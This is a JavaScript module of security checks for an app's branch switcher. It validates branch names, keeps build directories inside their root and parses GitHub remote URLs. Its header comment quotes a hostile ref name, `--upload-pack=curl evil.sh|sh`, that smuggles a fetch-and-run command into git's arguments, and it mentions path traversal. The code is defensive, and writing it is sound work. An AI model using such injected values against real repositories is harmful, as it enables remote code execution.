// The pure decisions behind the branch switcher: what counts as a legal branch
// name, where that branch's build is allowed to live, and what repository an
// `origin` URL names.
//
// Here rather than in `main/services/` because BOTH sides need it and they
// cannot share a `.ts`: the app is compiled and bundled, while
// `scripts/switch-branch.mjs` is plain `.mjs` run with no build step — the same
// split the MCP server has. A transcribed copy of `branchNameProblem` would be
// correct the day it was written and silently divergent forever after, and what
// diverges is a security check.
//
// Pure: no `fs`, no shell import, no `process`. Everything `check:branch-switch`
// and `branch-paths.test.ts` drive lives here, and all three of the security
// properties this feature has are decided in this file.
//
// ── Why a branch name needs validating at all ─────────────────────────────
// A branch name here does NOT come from the person typing it. It arrives from
// the GitHub API (a pull request's head ref, which anyone who can open a PR
// chooses) or from `git for-each-ref`, and it is then handed to git as an
// argument and used to name a directory. Two distinct holes:
//
//   • Option injection. `execFile` spawns no shell, so a name cannot inject a
//     command — but it IS still argv, and git reads a leading `-` as a flag.
//     A ref called `--upload-pack=curl evil.sh|sh` is a remote-code-execution
//     primitive against `git fetch` that no amount of shell-quoting would stop.
//     Rejecting a leading `-` is what stops it; `--` separators are used as
//     well, but only one of the two can be forgotten at a call site.
//
//   • Path traversal. The name becomes a directory under the builds root, so
//     `../../../..` reaches out of it — and what gets written there is a whole
//     checkout, which is then BUILT AND EXECUTED. `worktreeDirFor` refuses any
//     result that is not inside the root it was given, on resolved paths.
//
// The allowed set is deliberately narrower than git's own rules
// (git-check-ref-format permits a great deal more). A branch this refuses can
// still be reviewed on GitHub; the cost of being wrong in the other direction
// is running attacker-named code, so the tight side is the right side.

import { createHash } from "node:crypto";
import * as path from "node:path";

/** Longest branch name we'll accept. Well past anything real; a bound only so
 *  that neither the regex nor the directory name is unbounded. */
export const MAX_BRANCH_LENGTH = 200;

/** The characters a branch may be built from. Letters, digits, and the four
 *  punctuation marks real branch names use. Notably absent: whitespace, `~^:?*[`
 *  (which git itself forbids), backslash, and every shell metacharacter. */
const BRANCH_CHARS = /^[A-Za-z0-9._/-]+$/;

/**
 * Why a branch name is unacceptable, or `null` when it's fine.
 *
 * Returns the reason rather than a boolean so the UI can say what was wrong
 * with a ref it declined to offer — a PR that silently vanishes from the list
 * is indistinguishable from one the API never returned.
 *
 * @param {string} name
 * @returns {string | null}
 */
export function branchNameProblem(name) {
  if (typeof name !== "string" || name.length === 0) return "The branch name is empty.";
  if (name.length > MAX_BRANCH_LENGTH) {
    return `The branch name is longer than ${MAX_BRANCH_LENGTH} characters.`;
  }
  // FIRST, before the character test: `-` is in the allowed set (real branches
  // use it constantly) and is only dangerous in the leading position.
  if (name.startsWith("-")) {
    return "A branch name starting with “-” would be read by git as an option.";
  }
  if (!BRANCH_CHARS.test(name)) {
    return "A branch name may only contain letters, digits, and “. _ / -”.";
  }
  if (name.includes("..")) return "A branch name may not contain “..”.";
  if (name.startsWith("/") || name.endsWith("/")) {
    return "A branch name may not start or end with “/”.";
  }
  if (name.includes("//")) return "A branch name may not contain an empty path segment.";
  if (name.endsWith(".") || name.endsWith(".lock")) {
    return "A branch name may not end with “.” or “.lock”.";
  }
  // A component starting with `.` is both illegal in git and the shape that
  // produces a hidden directory (or `.git`) under the builds root.
  if (name.split("/").some((segment) => segment.startsWith("."))) {
    return "No part of a branch name may start with “.”.";
  }
  return null;
}

/**
 * @param {string} name
 * @returns {boolean}
 */
export function isValidBranchName(name) {
  return branchNameProblem(name) === null;
}

/**
 * Directory name for a branch's build.
 *
 * Two branches must never collide, and slugging alone cannot promise that:
 * `feat/login` and `feat-login` slug identically, and a collision here means
 * one branch's build silently runs as the other's. So the slug is only for
 * legibility (these directories get looked at by a human) and a hash of the
 * FULL name carries the uniqueness.
 *
 * @param {string} name
 * @returns {string}
 */
export function branchSlug(name) {
  const readable = name
    .replace(/[^A-Za-z0-9._-]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 48);
  const digest = createHash("sha256").update(name).digest("hex").slice(0, 8);
  return `${readable || "branch"}-${digest}`;
}

/**
 * True when `child` is `parent` or sits underneath it. Requires a separator at
 * the boundary, so `/a/builds-evil` is not treated as inside `/a/builds`.
 * (Same shape as import-service's `isInside`, and for the same reason.)
 *
 * @param {string} parent
 * @param {string} child
 * @returns {boolean}
 */
export function isInside(parent, child) {
  const p = path.resolve(parent);
  const c = path.resolve(child);
  return c === p || c.startsWith(p + path.sep);
}

/**
 * Where a branch's checkout and build live. Throws — never returns a fallback —
 * when the name is unacceptable or the result escapes `root`.
 *
 * The containment assert is kept even though `branchSlug` strips `/` and so
 * "cannot" escape. That is exactly the assumption a future change to slugging
 * would quietly break, and the thing on the other side of it is arbitrary code
 * written to an arbitrary path.
 *
 * @param {string} root
 * @param {string} branch
 * @returns {string}
 */
export function worktreeDirFor(root, branch) {
  const problem = branchNameProblem(branch);
  if (problem) throw new Error(problem);
  const dir = path.resolve(root, branchSlug(branch));
  if (!isInside(root, dir)) {
    throw new Error("Refused a branch build directory outside the builds root.");
  }
  return dir;
}

/**
 * Parse a GitHub owner/repo out of a git remote URL, or `null` when the remote
 * isn't GitHub. Handles the three forms `git remote get-url` reports:
 * `https://github.com/o/r(.git)`, `git@github.com:o/r(.git)`, and
 * `ssh://git@github.com/o/r(.git)`.
 *
 * Returning `null` rather than guessing is what lets the UI say "this remote
 * isn't on GitHub, so there are no pull requests to list" instead of showing an
 * empty list that reads as "no open PRs".
 *
 * @param {string} url
 * @returns {{ owner: string, name: string } | null}
 */
export function parseGitHubRemote(url) {
  const clean = (url ?? "")
    .trim()
    .replace(/\.git$/i, "")
    .replace(/\/+$/, "");
  if (!clean) return null;
  const patterns = [
    /^https?:\/\/(?:[^@/]+@)?github\.com\/([^/]+)\/([^/]+)$/i,
    /^ssh:\/\/(?:[^@/]+@)?github\.com\/([^/]+)\/([^/]+)$/i,
    /^(?:[^@\s]+@)?github\.com:([^/]+)\/([^/]+)$/i,
  ];
  for (const re of patterns) {
    const m = re.exec(clean);
    if (m) return { owner: m[1], name: m[2] };
  }
  return null;
}

/** The argv flag a relaunched branch build carries, so the process can tell
 *  that it is one. Read by `window-paths.ts` (which must then ignore a stale
 *  `GOOD_LOOKS_DEV_URL`) and by the switcher's status call. */
export const BRANCH_ARG_PREFIX = "--gl-branch=";

/** Passed on EVERY relaunch this feature performs, including the one back to
 *  the user's own checkout. `npm run dev` puts a Vite origin in the
 *  environment, a relaunch inherits it, and that server is gone the moment the
 *  dev harness notices Electron exited — so honouring it would load the new
 *  build's windows from a dead origin and show a blank window with a clean log. */
export const NO_DEV_URL_ARG = "--gl-no-dev-url";

/**
 * The branch this process was relaunched onto, or `null` when it is running the
 * user's own checkout.
 *
 * @param {readonly string[]} argv
 * @returns {string | null}
 */
export function branchFromArgv(argv) {
  for (const arg of argv) {
    if (typeof arg !== "string" || !arg.startsWith(BRANCH_ARG_PREFIX)) continue;
    const value = arg.slice(BRANCH_ARG_PREFIX.length);
    // Validate on the way IN too. This value decides what the UI claims is
    // running, and it arrives on a command line — which is not a trusted
    // channel just because we usually write it ourselves.
    return isValidBranchName(value) ? value : null;
  }
  return null;
}
